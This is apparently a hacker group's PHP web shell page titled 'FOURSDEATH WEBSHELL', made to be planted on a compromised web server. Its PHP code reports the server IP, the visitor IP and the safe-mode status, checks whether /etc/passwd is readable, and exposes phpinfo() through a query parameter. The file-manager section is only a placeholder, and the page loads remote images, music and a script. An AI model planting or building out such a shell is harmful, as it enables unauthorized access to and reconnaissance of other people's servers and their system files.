<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FOURSDEATH WEBSHELL</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background: url('https://g.top4top.io/p_1825r6iwh0.jpg') no-repeat center center fixed;
    background-size: cover;
    font-family: 'Courier New', monospace;
    color: #f2f2f2;
    text-shadow: 0 0 2px black;
  }
  header {
    text-align: center;
    padding: 1em 0;
    background: rgba(0, 0, 0, 0.7);
    border-bottom: 2px solid #33f702;
  }
  header h1 {
    margin: 0;
    color: gold;
  }
  header h4 {
    margin-top: 0.5em;
    color: white;
  }
  .logo {
    display: block;
    margin: 10px auto;
    width: 150px;
    height: auto;
  }
  main {
    max-width: 90%;
    margin: 20px auto;
    background: rgba(0, 0, 0, 0.6);
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px #000;
    overflow-x: auto;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 20px;
  }
  th, td {
    padding: 10px;
    border: 1px solid #33f702;
    text-align: center;
    word-break: break-word;
  }
  tr:nth-child(even) {
    background: rgba(255, 255, 255, 0.05);
  }
  tr:hover {
    background-color: #636263;
    text-shadow: 0px 0px 10px #fff;
  }
  a {
    color: #33f702;
    text-decoration: none;
  }
  a:hover {
    color: #fff;
    text-shadow: 0 0 5px white;
  }
  footer {
    text-align: center;
    margin-top: 30px;
    color: white;
  }
  audio {
    margin-top: 10px;
  }
  marquee {
    margin-top: 20px;
  }
  input, select, textarea {
    background: #111;
    color: white;
    border: 1px solid #666;
    border-radius: 5px;
    padding: 5px;
  }
</style>
</head>
<body>
  <header>
    <h1>FOURSDEATH WEBSHELL</h1>
    <h4>Mini Shell - by X'Boy Linux</h4>
    <img class="logo" src="https://i.top4top.io/p_22457217t0.png" alt="Logo">
  </header>
  <main>
    <?php
    // PHP info & server info section
    $etc_passwd = @is_readable("/etc/passwd") ? "<b><span style='color:white'>ON </span></b>" : "<b><span style='color:red'>OFF</span></b>";
    echo '<p><b>Server IP:</b> '.$_SERVER['SERVER_ADDR'].'<br>
          <b>Your IP:</b> '.$_SERVER['REMOTE_ADDR'].'<br>
          <b>Safe Mode:</b> '.(ini_get('safe_mode') ? '<span style="color:red">ON</span>' : '<span style="color:green">OFF</span>').'<br>
          <b>Read /etc/passwd:</b> '.$etc_passwd.'</p>';

    if(@$_GET['p'] == "info"){
      phpinfo();
      exit;
    }
    echo '<p><a href="?p=info">PHP INFO</a></p>';
    ?>
    <!-- FILE MANAGER / SHELL SECTION --><br>
    <p><b>File Manager Coming Here...</b></p>
  </main>
  <footer>
    <marquee behavior="alternate">Foursdeath Team - KalimantanBaratSec</marquee>
    <audio autoplay loop controls>
      <source src="https://b.top4top.io/m_17923krtx0.mp3" type="audio/mpeg">
      Your browser does not support the audio tag.
    </audio>
  </footer>
  <script src="https://raw.githubusercontent.com/AliandiYoto/efek-salju-v.1/master/efeksalju1.js" type="text/javascript"></script>
</body>
</html>
